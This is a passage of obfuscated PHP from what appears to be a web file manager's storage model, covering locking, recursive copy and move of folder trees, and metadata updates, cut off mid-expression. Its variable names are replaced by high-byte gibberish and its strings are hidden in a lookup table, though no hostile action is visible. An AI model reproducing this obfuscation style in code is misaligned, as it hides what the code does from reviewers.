$Ûª‘³é• =& $_SERVER[§Êá¸İ]; $—ãÔ–¯É = $ûíœß . $Ûª‘³é•[10] . $œ¨²œÓ»; CacheLock::setErrorMsg($Ûª‘³é•[454]); if (!isset($this->_lockTimeStart[$—ãÔ–¯É])) { return; } $ì­ú²¡ = timeFloat() - $this->_lockTimeStart[$—ãÔ–¯É]; unset($this->_lockTimeStart[$—ãÔ–¯É]); if ($ì­ú²¡ > 0.5) { unset(self::$cacheSourceInfo[$Ûª‘³é•[541] . $œ¨²œÓ»]); } $ŞßƒîÂ = $this->sourceInfo($œ¨²œÓ»); if (!$ŞßƒîÂ) { show_json(LNG($Ûª‘³é•[108]), !1); } } private function _lockParent($‡âÉÀÏ«, $¥«İšæê, $¸•¾Ÿ×õ) { if (!$this->autoLockSet) { return; } $Á‡ûä = $this->sourceInfo($‡âÉÀÏ«); if (!is_array($Á‡ûä)) { return; } $ çº±» = array_reverse($this->parentLevelArray($Á‡ûä[$_SERVER[§Êá¸İ][592]])); foreach ($ çº±» as $©“¯ŞĞû) { $this->_lockEvent($©“¯ŞĞû, $¥«İšæê, $¸•¾Ÿ×õ); } } private function _lockEvent($ìîíß¸‚, $—ÃÕ¦âï, $ÉÅÅîœ•) { $îõë½ =& $_SERVER[§Êá¸İ]; if (!$this->autoLockSet) { return; } foreach ($—ÃÕ¦âï as $·ÛÇó ˜) { $¸–ÃÌëÃ = $·ÛÇó ˜ . $îõë½[10] . $ìîíß¸‚; if ($ÉÅÅîœ• && CacheLock::lockGet($îõë½[636] . $¸–ÃÌëÃ)) { continue; } $this->_lockKey($¸–ÃÌëÃ, $ÉÅÅîœ•); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($¯şÇÇ¶, $ûÑìŸÒë = 1) { $§ó›á‘„ = $_SERVER[§Êá¸İ][636] . md5($¯şÇÇ¶); if ($ûÑìŸÒë) { if (isset(self::$_lockItemArr[$§ó›á‘„])) { return; } self::$_lockItemArr[$§ó›á‘„] = 1; CacheLock::lock($§ó›á‘„, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$§ó›á‘„])) { return; } unset(self::$_lockItemArr[$§ó›á‘„]); CacheLock::unlock($§ó›á‘„); } } public function isParentOf($ßéÇ­Á¬, $åØÒùî) { $ãŒÕÚ· =& $_SERVER[§Êá¸İ]; $Şª›·—ƒ = $this->sourceInfo($ßéÇ­Á¬); $ˆç“ö“¾ = $this->sourceInfo($åØÒùî); $ÍÃ¸âÈ’ = $Şª›·—ƒ[$ãŒÕÚ·[592]] . $Şª›·—ƒ[$ãŒÕÚ·[193]] . $ãŒÕÚ·[50]; $äë¦øÑ = $ˆç“ö“¾[$ãŒÕÚ·[592]] . $ˆç“ö“¾[$ãŒÕÚ·[193]] . $ãŒÕÚ·[50]; $·ø¹Î®á = strpos($äë¦øÑ, $ÍÃ¸âÈ’) === 0; return $·ø¹Î®á; } private $targetIsDelete = 0; public function copy($‘çÜ§´í, $¢ğîÎÕÉ, $ËÜ››€é = REPEAT_REPLACE, $¡ü¤³ = '') { $†¡÷²¸ =& $_SERVER[§Êá¸İ]; $È•×™¢Ş = $this->sourceInfo($‘çÜ§´í); $áºóÇæ = $this->sourceInfo($¢ğîÎÕÉ); if (!$È•×™¢Ş || !$áºóÇæ || $áºóÇæ[$†¡÷²¸[493]] != $†¡÷²¸[91]) { return !1; } if ($this->isParentOf($‘çÜ§´í, $¢ğîÎÕÉ)) { return !1; } $ç¬·ÄòÇ = $¡ü¤³ ? $¡ü¤³ : $È•×™¢Ş[$†¡÷²¸[32]]; $this->lockCopyStart($‘çÜ§´í); $this->lockWriteStart($¢ğîÎÕÉ, $ç¬·ÄòÇ); $é³×¶ª½ = array($†¡÷²¸[637] => array(), $†¡÷²¸[638] => array(), $†¡÷²¸[639] => array()); $this->targetIsDelete = intval($È•×™¢Ş[$†¡÷²¸[513]]); $ÒÀœ‘…¶ = $this->fileNameExistAuto($¢ğîÎÕÉ, $È•×™¢Ş); $ãœüãûú = $this->_copy($‘çÜ§´í, $¢ğîÎÕÉ, $ËÜ››€é, $é³×¶ª½, !0, $¡ü¤³); $this->_childrenListClear(); $this->lockCopyEnd($‘çÜ§´í); $this->lockWriteEnd($¢ğîÎÕÉ, $ç¬·ÄòÇ); if ($È•×™¢Ş[$†¡÷²¸[493]] == $†¡÷²¸[91] && $ÒÀœ‘…¶ == $ãœüãûú) { $this->folderSizeResetChildren($ÒÀœ‘…¶); } Model($†¡÷²¸[640])->addAll($é³×¶ª½[$†¡÷²¸[638]], array(), !0); if ($ÒÀœ‘…¶ != $ãœüãûú || $È•×™¢Ş[$†¡÷²¸[493]] == $†¡÷²¸[91]) { Model($†¡÷²¸[641])->eventCopy($ãœüãûú); } $this->saveAll($é³×¶ª½[$†¡÷²¸[639]]); Model($†¡÷²¸[230])->linkAdd($é³×¶ª½[$†¡÷²¸[637]]); $this->folderSizeReset($¢ğîÎÕÉ); $this->updateModifyTime($¢ğîÎÕÉ); return $ãœüãûú; } private function _copy($–ã‰ ¾à, $ç½¢¨Šë, $¬‚¯«ÛÜ, &$¦¾Š§ùĞ, $á™¼×¥Ã, $¬«¸œó = '') { $Ï˜Ëİ‘ò =& $_SERVER[§Êá¸İ]; $òÒ·†É = $this->sourceInfoCache($–ã‰ ¾à); $¨‚êèƒ£ = $òÒ·†É[$Ï˜Ëİ‘ò[493]] == $Ï˜Ëİ‘ò[91]; $á¯›£éå = $¬«¸œó ? $¬«¸œó : $òÒ·†É[$Ï˜Ëİ‘ò[32]]; $‹à„· = $this->fileNameExistAuto($ç½¢¨Šë, $òÒ·†É); if ($á™¼×¥Ã) { $this->_childrenAllMake($–ã‰ ¾à); if ($¨‚êèƒ£ && $‹à„·) { $this->_childrenAllMake($‹à„·); } } if (!$‹à„·) { return $this->_copyCreate($–ã‰ ¾à, $ç½¢¨Šë, $á¯›£éå, $¦¾Š§ùĞ); } $º°Ï€ = $‹à„·; if ($¨‚êèƒ£) { if ($¬‚¯«ÛÜ == REPEAT_RENAME_FOLDER) { $á¯›£éå = $this->fileNameAutoCache($ç½¢¨Šë, $á¯›£éå, $¬‚¯«ÛÜ, $¨‚êèƒ£); $º°Ï€ = $this->_copyCreate($–ã‰ ¾à, $ç½¢¨Šë, $á¯›£éå, $¦¾Š§ùĞ); } else { $‹Ïş×ê = $this->_childrenList($–ã‰ ¾à); foreach ($‹Ïş×ê as $ƒ–Â»¶‹) { $this->_copy($ƒ–Â»¶‹[$Ï˜Ëİ‘ò[193]], $‹à„·, $¬‚¯«ÛÜ, $¦¾Š§ùĞ, !1); } } } else { if ($¬‚¯«ÛÜ == REPEAT_RENAME || $¬‚¯«ÛÜ == REPEAT_RENAME_FOLDER) { $á¯›£éå = $this->fileNameAutoCache($ç½¢¨Šë, $á¯›£éå, $¬‚¯«ÛÜ, $¨‚êèƒ£); $º°Ï€ = $this->_copyCreate($–ã‰ ¾à, $ç½¢¨Šë, $á¯›£éå, $¦¾Š§ùĞ); } else { if ($¬‚¯«ÛÜ == REPEAT_REPLACE) { $ŸÍğÂü = $this->sourceInfoCache($‹à„·); $Û´“îÔ = $this->fileHistory($ŸÍğÂü, $òÒ·†É[$Ï˜Ëİ‘ò[549]], $òÒ·†É[$Ï˜Ëİ‘ò[79]]); if ($Û´“îÔ) { $¦¾Š§ùĞ[$Ï˜Ëİ‘ò[637]][] = $òÒ·†É[$Ï˜Ëİ‘ò[549]]; } } else { if ($¬‚¯«ÛÜ == REPEAT_SKIP) { } } } Hook::trigger($Ï˜Ëİ‘ò[642], array($Ï˜Ëİ‘ò[643], $òÒ·†É, 0)); } return $º°Ï€; } private function _copyCreate($äÓÎ¹ÏÁ, $™ıõ²Çƒ, $ÚûŞøÕÃ, &$ù¡Ë…´ğ) { $‰·­ì™„ =& $_SERVER[§Êá¸İ]; $¾ä‘©æá = $this->sourceInfoCache($äÓÎ¹ÏÁ); $ÒİøÙÀ = $this->sourceInfoCache($™ıõ²Çƒ); $¹’‰÷õé = $this->_makeItemData($¾ä‘©æá, $ÒİøÙÀ, $ÚûŞøÕÃ); Hook::trigger($‰·­ì™„[644], $¹’‰÷õé); Hook::trigger($‰·­ì™„[645], array($‰·­ì™„[646], $¹’‰÷õé, 0)); $®¸ó€âÓ = $this->add($¹’‰÷õé); $¦¥ğº‘Ö = array($‰·­ì™„[193] => $®¸ó€âÓ, $‰·­ì™„[32] => $ÚûŞøÕÃ); $this->_copyApplyMeta($¦¥ğº‘Ö, $ù¡Ë…´ğ); if ($¾ä‘©æá[$‰·­ì™„[493]] != $‰·­ì™„[91]) { $ù¡Ë…´ğ[$‰·­ì™„[637]][] = $¾ä‘©æá[$‰·­ì™„[549]]; return $®¸ó€âÓ; } $ñ¾ãÊŞÆ = array(); $òÕØß… = array(); $this->_childrenListAll($äÓÎ¹ÏÁ, $ñ¾ãÊŞÆ); $êİ·Ä„Æ = count($ñ¾ãÊŞÆ); if ($êİ·Ä„Æ == 0) { return $®¸ó€âÓ; } $ºãÉ÷°” = $this->sourceInfo($®¸ó€âÓ); foreach ($ñ¾ãÊŞÆ as $®Üº‚¬ü) { $ÆŠÒóÆá = $this->_makeItemData($®Üº‚¬ü, $ºãÉ÷°”, $®Üº‚¬ü[$‰·­ì™„[32]]); $ÆŠÒóÆá[$‰·­ì™„[592]] = $®Üº‚¬ü[$‰·­ì™„[592]]; $òÕØß…[] = $ÆŠÒóÆá; } $this->chunkEventSet($‰·­ì™„[647], array($‰·­ì™„[648], $¹’‰÷õé, $êİ·Ä„Æ)); $this->addAll($òÕØß…, array(), !1); $½í•®ÌÓ = $this->where(array($‰·­ì™„[192] => $®¸ó€âÓ))->select(); $õÙ¤üÇ¡ = $this->_childrenMakeRelation($ñ¾ãÊŞÆ, $½í•®ÌÓ); $õÙ¤üÇ¡[$äÓÎ¹ÏÁ] = $®¸ó€âÓ; $øŒø×ÁÙ = array(); $÷­“¦ü = array(); foreach ($½í•®ÌÓ as $®Üº‚¬ü) { $‚¿ÚÛÌÊ = $®Üº‚¬ü[$‰·­ì™„[193]]; $’ş–îªŒ = $this->_childrenMatch($õÙ¤üÇ¡, $®Üº‚¬ü, $ºãÉ÷°”); $øŒø×ÁÙ[] = array($‰·­ì™„[193], $‚¿ÚÛÌÊ, $‰·­ì™„[192], $’ş–îªŒ[$‰·­ì™„[192]]); $÷­“¦ü[] = array($‰·­ì™„[193], $‚¿ÚÛÌÊ, $‰·­ì™„[592], $’ş–îªŒ[$‰·­ì™„[592]]); $this->_copyApplyMeta($®Üº‚¬ü, $ù¡Ë…´ğ); if ($®Üº‚¬ü[$‰·­ì™„[493]] != $‰·­ì™„[91]) { $ù¡Ë…´ğ[$‰·­ì™„[637]][] = $®Üº‚¬ü[$‰·­ì™„[549]]; } } $this->chunkEventSet($‰·­ì™„[649], array($‰·­ì™„[650], $¹’‰÷õé, $êİ·Ä„Æ)); $this->saveAll($øŒø×ÁÙ); $this->chunkEventSet($‰·­ì™„[651], array($‰·­ì™„[652], $¹’‰÷õé, $êİ·Ä„Æ)); $this->saveAll($÷­“¦ü); return $®¸ó€âÓ; } private function _childrenMakeRelation($ƒü™å¼Ã, $­Š–ŒÑ¿) { $é‡®‰êÑ =& $_SERVER[§Êá¸İ]; $Øíó˜ñÓ = array(); $½„×‡ç = array(); foreach ($ƒü™å¼Ã as $»ú³‡Ï’) { $ïˆŠá÷ = $»ú³‡Ï’[$é‡®‰êÑ[32]] . $é‡®‰êÑ[8] . $»ú³‡Ï’[$é‡®‰êÑ[592]]; $Øíó˜ñÓ[$ïˆŠá÷] = $»ú³‡Ï’[$é‡®‰êÑ[193]]; } foreach ($­Š–ŒÑ¿ as $»ú³‡Ï’) { $ïˆŠá÷ = $»ú³‡Ï’[$é‡®‰êÑ[32]] . $é‡®‰êÑ[8] . $»ú³‡Ï’[$é‡®‰êÑ[592]]; $ïî¿·’ã = $Øíó˜ñÓ[$ïˆŠá÷]; $½„×‡ç[$ïî¿·’ã] = $»ú³‡Ï’[$é‡®‰êÑ[193]]; } return $½„×‡ç; } private function _childrenMatch($Ï›Üşˆ, $îã•¬Û, $¶€†ıœ£) { $ÈåÚ¿¦· =& $_SERVER[§Êá¸İ]; $¢÷•æ = $¶€†ıœ£[$ÈåÚ¿¦·[592]]; $Å±›öÍö = $this->parentLevelArray($îã•¬Û[$ÈåÚ¿¦·[592]]); foreach ($Å±›öÍö as $òı€ƒŞå) { if (isset($Ï›Üşˆ[$òı€ƒŞå])) { $¢÷•æ .= $Ï›Üşˆ[$òı€ƒŞå] . $ÈåÚ¿¦·[653]; } } $¢÷•æ = rtrim($¢÷•æ, $ÈåÚ¿¦·[50]) . $ÈåÚ¿¦·[50]; $Á²¼ÎÀÔ = $this->parentLevelArray($¢÷•æ); $ÀÜñ£¾É = $Á²¼ÎÀÔ[count($Á²¼ÎÀÔ) - 1]; return array($ÈåÚ¿¦·[192] => $ÀÜñ£¾É, $ÈåÚ¿¦·[592] => $¢÷•æ); } private function _makeItemData($¨‚ÇÁÛ³, $íÙ³‡“, $°çŠæñ) { $£¾ÔƒµŠ =& $_SERVER[§Êá¸İ]; $ˆƒÛï¤å = array($£¾ÔƒµŠ[654] => $¨‚ÇÁÛ³[$£¾ÔƒµŠ[493]], $£¾ÔƒµŠ[502] => $°çŠæñ, $£¾ÔƒµŠ[655] => $¨‚ÇÁÛ³[$£¾ÔƒµŠ[494]] ? $¨‚ÇÁÛ³[$£¾ÔƒµŠ[494]] : $£¾ÔƒµŠ[12], $£¾ÔƒµŠ[550] => $¨‚ÇÁÛ³[$£¾ÔƒµŠ[549]] ? $¨‚ÇÁÛ³[$£¾ÔƒµŠ[549]] : 0, $£¾ÔƒµŠ[625] => $¨‚ÇÁÛ³[$£¾ÔƒµŠ[79]] ? $¨‚ÇÁÛ³[$£¾ÔƒµŠ[79]] : 0, $£¾ÔƒµŠ[656] => intval($íÙ³‡“[$£¾ÔƒµŠ[190]]), $£¾ÔƒµŠ[657] => intval($íÙ³‡“[$£¾ÔƒµŠ[577]]), $£¾ÔƒµŠ[658] => intval(USER_ID), $£¾ÔƒµŠ[659] => intval(USER_ID), $£¾ÔƒµŠ[485] => intval($íÙ³‡“[$£¾ÔƒµŠ[193]]), $£¾ÔƒµŠ[660] => $íÙ³‡“[$£¾ÔƒµŠ[592]] . $íÙ³‡“[$£¾ÔƒµŠ[193]] . $£¾ÔƒµŠ[50], $£¾ÔƒµŠ[506] => $¨‚ÇÁÛ³[$£¾ÔƒµŠ[88]] ? $¨‚ÇÁÛ³[$£¾ÔƒµŠ[88]] : time(), $£¾ÔƒµŠ[512] => 0, $£¾ÔƒµŠ[661] => $£¾ÔƒµŠ[12]); return $ˆƒÛï¤å; } private function _copyApplyMeta($Ş¾ôõì, &$ÆÏóÙ»è) { $—£¯”Õ« =& $_SERVER[§Êá¸İ]; $¸¹Ö¾Ê• = $Ş¾ôõì[$—£¯”Õ«[193]]; $ÔÛğó£ã = $Ş¾ôõì[$—£¯”Õ«[32]]; if (!isset($Ş¾ôõì[$—£¯”Õ«[662]]) || !$Ş¾ôõì[$—£¯”Õ«[662]] || $Ş¾ôõì[$—£¯”Õ«[662]] == $—£¯”Õ«[228]) { $ÆÏóÙ»è[$—£¯”Õ«[639]][] = array($—£¯”Õ«[193], $¸¹Ö¾Ê•, $—£¯”Õ«[662], short_id($¸¹Ö¾Ê•)); } if (Input::check($ÔÛğó£ã, $—£¯”Õ«[663])) { $ÆÏóÙ»è[$—£¯”Õ«[638]][] = array($—£¯”Õ«[193] => $¸¹Ö¾Ê•, $—£¯”Õ«[97] => $—£¯”Õ«[546], $—£¯”Õ«[450] => str_replace($—£¯”Õ«[53], $—£¯”Õ«[12], Pinyin::get($ÔÛğó£ã))); $ÆÏóÙ»è[$—£¯”Õ«[638]][] = array($—£¯”Õ«[193] => $¸¹Ö¾Ê•, $—£¯”Õ«[97] => $—£¯”Õ«[545], $—£¯”Õ«[450] => Pinyin::get($ÔÛğó£ã, $—£¯”Õ«[664])); } $ÆÏóÙ»è[$—£¯”Õ«[638]][] = array($—£¯”Õ«[193] => $¸¹Ö¾Ê•, $—£¯”Õ«[97] => $—£¯”Õ«[525], $—£¯”Õ«[450] => KodSort::makeStr($ÔÛğó£ã)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ àö ÇÃ) { $âÁöú–Â =& $_SERVER[§Êá¸İ]; $°Éç¶‹“ = $this->sourceInfo($ àö ÇÃ); $Æ¤«Ì”í = $âÁöú–Â[665]; $×¬©ëÒ = array($âÁöú–Â[592] => array($âÁöú–Â[620], $°Éç¶‹“[$âÁöú–Â[592]] . $ àö ÇÃ . $âÁöú–Â[621]), $âÁöú–Â[513] => $this->targetIsDelete); $ˆñ¨é» = $this->field($Æ¤«Ì”í)->where($×¬©ëÒ)->select(); if (!$ˆñ¨é») { return; } $ˆñ¨é» = array_to_keyvalue($ˆñ¨é», $âÁöú–Â[193]); foreach ($ˆñ¨é» as $˜ê‘£—•) { $Ú±ëİ¼Ô = $˜ê‘£—•[$âÁöú–Â[192]]; $ àö ÇÃ = $˜ê‘£—•[$âÁöú–Â[193]]; if (!isset($this->_childrenListCache[$ àö ÇÃ]) && $˜ê‘£—•[$âÁöú–Â[493]] == $âÁöú–Â[91]) { $this->_childrenListCache[$ àö ÇÃ] = array(); } if (!isset($this->_childrenListCache[$Ú±ëİ¼Ô])) { $this->_childrenListCache[$Ú±ëİ¼Ô] = array(); } $this->_childrenListCache[$Ú±ëİ¼Ô][$ àö ÇÃ] = $˜ê‘£—•; $this->_childrenItemCache[$ àö ÇÃ] = $˜ê‘£—•; } } private function _childrenListAll($öéìó²î, &$àóª¡ª§) { $³÷–Íñ =& $_SERVER[§Êá¸İ]; if (!isset($this->_childrenListCache[$öéìó²î])) { return; } $¦Ş§ç¶î = $this->_childrenListCache[$öéìó²î]; foreach ($¦Ş§ç¶î as $¼‹¯‚ÌÀ => $†µ÷İÔ´) { $àóª¡ª§[$¼‹¯‚ÌÀ] = $†µ÷İÔ´; if ($†µ÷İÔ´[$³÷–Íñ[493]] == $³÷–Íñ[91]) { $this->_childrenListAll($¼‹¯‚ÌÀ, $àóª¡ª§); } } } private function sourceInfoCache($„ûöòƒú) { if (isset($this->_childrenItemCache[$„ûöòƒú])) { return $this->_childrenItemCache[$„ûöòƒú]; } return $this->sourceInfo($„ûöòƒú); } private function _childrenList($ñß§¾¿Œ) { if (isset($this->_childrenListCache[$ñß§¾¿Œ])) { return $this->_childrenListCache[$ñß§¾¿Œ]; } return $this->_childrenListSelect($ñß§¾¿Œ); } private function _childrenListSelect($óì–Å“é) { $È¼’±¬ =& $_SERVER[§Êá¸İ]; $Î÷äÇä = array($È¼’±¬[192] => $óì–Å“é, $È¼’±¬[513] => $this->targetIsDelete); $Äõ–Ä° = $this->where($Î÷äÇä)->select(); $Äõ–Ä° = $Äõ–Ä° ? $Äõ–Ä° : array(); $ôåıÈÚ = array_to_keyvalue($Äõ–Ä°, $È¼’±¬[193]); $this->_childrenListCache[$óì–Å“é] = $ôåıÈÚ; foreach ($ôåıÈÚ as $óì–Å“é => $¡‚¸£ğ) { $this->_childrenItemCache[$óì–Å“é] = $¡‚¸£ğ; } return $ôåıÈÚ; } private function fileNameExistAuto($õÍ¸¾˜À, $×ß—Úíü) { $ë¡ÒİİÊ =& $_SERVER[§Êá¸İ]; if ($×ß—Úíü[$ë¡ÒİİÊ[513]] == $ë¡ÒİİÊ[91]) { return $this->fileNameExist($õÍ¸¾˜À, $×ß—Úíü[$ë¡ÒİİÊ[32]]); } return $this->fileNameExistCache($õÍ¸¾˜À, $×ß—Úíü[$ë¡ÒİİÊ[32]]); } private function fileNameExistCache($û©íî“è, $ğ­ªíß) { $ù„õÇò¶ =& $_SERVER[§Êá¸İ]; $ğ­ªíß = strtolower($ğ­ªíß); $àÓ ÃåË = $this->_childrenList($û©íî“è); foreach ($àÓ ÃåË as $‰óÃ§ŠÛ) { if ($ğ­ªíß == strtolower($‰óÃ§ŠÛ[$ù„õÇò¶[32]])) { return $‰óÃ§ŠÛ[$ù„õÇò¶[193]]; } } return !1; } private function fileNameAutoCache($©Ğñëİ”, $–‡Êà£Ê, $”Œ”«şã, $Ç‰Óé‚) { $ğ°Úìåí =& $_SERVER[§Êá¸İ]; $Ò†…Ì = $this->_childrenList($©Ğñëİ”); $ıùèóÛ = array_to_keyvalue($Ò†…Ì, $ğ°Úìåí[12], $ğ°Úìåí[32]); return $this->fileNameAutoGet($ıùèóÛ, $–‡Êà£Ê, $”Œ”«şã, $Ç‰Óé‚); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($…Ø§µêÀ, $¸î¼¨äÉ, $­»·œ‡ = REPEAT_REPLACE, $ŸßÆ”©à = '') { $Ú­ºæ½û =& $_SERVER[§Êá¸İ]; $€à§¶› = $this->sourceInfo($…Ø§µêÀ); $Ÿ•¿ıå— = $this->sourceInfo($¸î¼¨äÉ); if ($€à§¶›[$Ú­ºæ½û[192]] == $Ÿ•¿ıå—[$Ú­ºæ½û[193]]) { if ($€à§¶›[$Ú­ºæ½û[513]] == $Ú­ºæ½û[91]) { Model($Ú­ºæ½û[511])->restore(array($…Ø§µêÀ)); } if (!$ŸßÆ”©à || $ŸßÆ”©à == $€à§¶›[$Ú­ºæ½û[32]]) { return $…Ø§µêÀ; } } $Ñ ñ—¦‰ = $this->pathInfoMore($…Ø§µêÀ); if ($this->isParentOf($…Ø§µêÀ, $¸î¼¨äÉ)) { return !1; } if (!$€à§¶› || !$Ÿ•¿ıå— || $Ÿ•¿ıå—[$Ú­ºæ½û[493]] != $Ú­ºæ½û[91]) { return !1; } Hook::trigger($Ú­ºæ½û[666], $Ñ ñ—¦‰); $this->targetIsDelete = intval($€à§¶›[$Ú­ºæ½û[513]]); if ($€à§¶›[$Ú­ºæ½û[192]] == $¸î¼¨äÉ && $ŸßÆ”©à != $€à§¶›[$Ú­ºæ½û[32]]) { $ĞÊšÆŞ = $this->fileNameExist($¸î¼¨äÉ, $ŸßÆ”©à); if ($ĞÊšÆŞ && $€à§¶›[$Ú­ºæ½û[493]] == $Ú­ºæ½û[228]) { $“úùç‡Ë = $this->sourceInfo($ĞÊšÆŞ); $„İÅæ¿ù = $this->fileHistory($“úùç‡Ë, $€à§¶›[$Ú­ºæ½û[549]], $€à§¶›[$Ú­ºæ½û[79]]); if (!$„İÅæ¿ù) { Model($Ú­ºæ½û[552])->remove($€à§¶›[$Ú­ºæ½û[549]]); } $this->removeNow($…Ø§µêÀ, !1); $this->folderSizeReset($¸î¼¨äÉ); Hook::trigger($Ú­ºæ½û[667], $Ñ ñ—¦‰); return $ĞÊšÆŞ; } } $Î„ ¾¸Ô = $ŸßÆ”©à ? $ŸßÆ”©à : $€à§¶›[$Ú­ºæ½û[32]]; $this->lockMoveStart($…Ø§µêÀ); $this->lockWriteStart($¸î¼¨äÉ, $Î„ ¾¸Ô); $ÎÁ¤ÂÙà = array($Ú­ºæ½û[637] => array(), $Ú­ºæ½û[668] => !1); $this->clearShare($…Ø§µêÀ, $¸î¼¨äÉ); $¦Òº£¾Ä = $this->fileNameExistAuto($¸î¼¨äÉ, $€à§¶›); $Úø²˜Ñ = $this->_move($…Ø§µêÀ, $¸î¼¨äÉ, $­»·œ‡, $ÎÁ¤ÂÙà, $ŸßÆ”©à); $this->sourceCacheClear(); if ($€à§¶›[$Ú­ºæ½û[493]] == $Ú­ºæ½û[91] && $¦Òº£¾Ä) { $this->folderSizeResetChildren($Úø²˜Ñ); } Model($Ú­ºæ½û[230])->linkAdd($ÎÁ¤ÂÙà[$Ú­ºæ½û[637]]); if ($¦Òº£¾Ä && $ÎÁ¤ÂÙà[$Ú­ºæ½û[668]]) { $this->removeNow($…Ø§µêÀ, !1); } $this->lockMoveEnd($…Ø§µêÀ); $this->lockWriteEnd($¸î¼¨äÉ, $Î„ ¾¸Ô); $this->folderSizeReset($€à§¶›[$Ú­ºæ½û[192]]); $this->folderSizeReset($¸î¼¨äÉ); $›è±ñÊü = array($€à§¶›[$Ú­ºæ½û[192]], $¸î¼¨äÉ); if ($€à§¶›[$Ú­ºæ½û[493]] == $Ú­ºæ½û[91]) { $›è±ñÊü[] = $…Ø§µêÀ; } $this->updateModifyTime($›è±ñÊü); Model($Ú­ºæ½û[641])->eventMove($…Ø§µêÀ, $€à§¶›[$Ú­ºæ½û[192]], $¸î¼¨äÉ); Hook::trigger($Ú­ºæ½û[667], $Ñ ñ—¦‰); return $Úø²˜Ñ; } private function _move($Ğèë‘¶Â, $¿‘Æ©¹ô, $î€»·‰, &$â¹Ä—ë©, $Ö­¼¤ª¸ = '') { $¬‡áÒªˆ =& $_SERVER[§Êá¸İ]; $äşÁ¥ì¬ = $this->sourceInfo($Ğèë‘¶Â); $“’òÉåÂ = $äşÁ¥ì¬[$¬‡áÒªˆ[493]] == $¬‡áÒªˆ[91]; $¶·ØºÓ = $Ö­¼¤ª¸ ? $Ö­¼¤ª¸ : $äşÁ¥ì¬[$¬‡áÒªˆ[32]]; $×äö÷Óò = $this->fileNameExistAuto($¿‘Æ©¹ô, $äşÁ¥ì¬); $this->lockMoveStart($Ğèë‘¶Â); $this->lockWriteStart($¿‘Æ©¹ô, $¶·ØºÓ); if (!$×äö÷Óò) { return $this->_moveForce($Ğèë‘¶Â, $¿‘Æ©¹ô, $¶·ØºÓ); } $ËÏÙ¶½Ô = $×äö÷Óò; $½ÏÚÀ« = !1; if ($“’òÉåÂ) { if ($î€»·‰ == REPEAT_RENAME_FOLDER) { $¶·ØºÓ = $this->fileNameAuto($¿‘Æ©¹ô, $¶·ØºÓ, $î€»·‰, $“’òÉåÂ); $ËÏÙ¶½Ô = $this->_moveForce($Ğèë‘¶Â, $¿‘Æ©¹ô, $¶·ØºÓ); } else { if ($î€»·‰ == REPEAT_RENAME_FOLDER) { $î€»·‰ = REPEAT_RENAME; } $¨»¼áÓ = $this->_childrenListSelect($Ğèë‘¶Â); foreach ($¨»¼áÓ as $çôÁ²Î¨) { $this->_move($çôÁ²Î¨[$¬‡áÒªˆ[193]], $×äö÷Óò, $î€»·‰, $â¹Ä—ë©); } $½ÏÚÀ« = !0; } } else { if ($î€»·‰ == REPEAT_SKIP) { $½ÏÚÀ« = !0; } else { if ($î€»·‰ == REPEAT_RENAME || $î€»·‰ == REPEAT_RENAME_FOLDER) { $¶·ØºÓ = $this->fileNameAuto($¿‘Æ©¹ô, $¶·ØºÓ, $î€»·‰, $“’òÉåÂ); $ËÏÙ¶½Ô = $this->_moveForce($Ğèë‘¶Â, $¿‘Æ©¹ô, $¶·ØºÓ); } else { if ($î€»·‰ == REPEAT_REPLACE) { $ƒ”­«×ù = $this->sourceInfoCache($×äö÷Óò); $ó‚æ‘¥« = $this->fileHistory($ƒ”­«×ù, $äşÁ¥ì¬[$¬‡áÒªˆ[549]], $äşÁ¥ì¬[$¬‡áÒªˆ[79]]); $½ÏÚÀ« = !0; if ($ó‚æ‘¥«) { $â¹Ä—ë©[$¬‡áÒªˆ[637]][] = $äşÁ¥ì¬[$¬‡áÒªˆ[549]]; } } } } } if ($½ÏÚÀ« && !$â¹Ä—ë©[$¬‡áÒªˆ[668]]) { $â¹Ä—ë©[$¬‡áÒªˆ[668]] = !0; } return $ËÏÙ¶½Ô; } private function _moveForce($şÁ™ºú, $óåü·†¨, $²€·–¼ó) { $Öƒ­Î =& $_SERVER[§Êá¸İ]; $ùûá²¤© = $this->sourceInfo($şÁ™ºú); $’¬Øµš = $this->sourceInfo($óåü·†¨); $ğ¼¶­“ã = $ùûá²¤©[$Öƒ­Î[493]] == $Öƒ­Î[91]; $¸í‡„Ïà = array($Öƒ­Î[485] => $’¬Øµš[$Öƒ­Î[193]], $Öƒ­Î[660] => $’¬Øµš[$Öƒ­Î[592]] . $’¬Øµš[$Öƒ­Î[193]] . $Öƒ­Î[50], $Öƒ­Î[656] => $’¬Øµš[$Öƒ­Î[190]], $Öƒ­Î[657] => $’¬Øµš[$Öƒ­Î[577]], $Öƒ­Î[659] => USER_ID, $Öƒ­Î[502] => $²€·–¼ó); $«ô¢ÉÀÓ = $ùûá²¤©[$Öƒ­Î[190]] == SourceModel::TYPE_GROUP && $’¬Øµš[$Öƒ­Î[190]] == SourceModel::TYPE_GROUP && $ùûá²¤©[$Öƒ­Î[577]] == $’¬Øµš[$Öƒ­Î[577]]; if (!$«ô¢ÉÀÓ && $this->moveClearAuth) { Model($Öƒ­Î[575])->authClear($şÁ™ºú); } $Æöê°Æ± = $ùûá²¤©[$Öƒ­Î[513]] == $Öƒ­Î[91] && $’¬Øµš[$Öƒ­Î[513]] != $Öƒ­Î[91]; if ($Æöê°Æ±) { $¸í‡„Ïà[$Öƒ­Î[512]] = 0; } if ($ğ¼¶­“ã) { $Ò¿Ù¦Î¿ = array($Öƒ­Î[660] => array($Öƒ­Î[620], $ùûá²¤©[$Öƒ­Î[592]] . $ùûá²¤©[$Öƒ­Î[193]] . $Öƒ­Î[621])); $¶¡‰âöİ = $ùûá²¤©[$Öƒ­Î[592]] . $ùûá²¤©[$Öƒ­Î[193]] . $Öƒ­Î[50]; $óÚê‹ûÃ = $’¬Øµš[$Öƒ­Î[592]] . $’¬Øµš[$Öƒ­Î[193]] . $Öƒ­Î[50] . $ùûá²¤©[$Öƒ­Î[193]] . $Öƒ­Î[50]; $µÜ®´šø = array($Öƒ­Î[660] => array($Öƒ­Î[669], "\162\x65\160\154\x61\143\x65\x28\160\x61\x72\145\x6e\164\x4c\145\x76\x65\x6c\54\47{$¶¡‰âöİ}\x27\x2c\x27{$óÚê‹ûÃ}\47\51"), 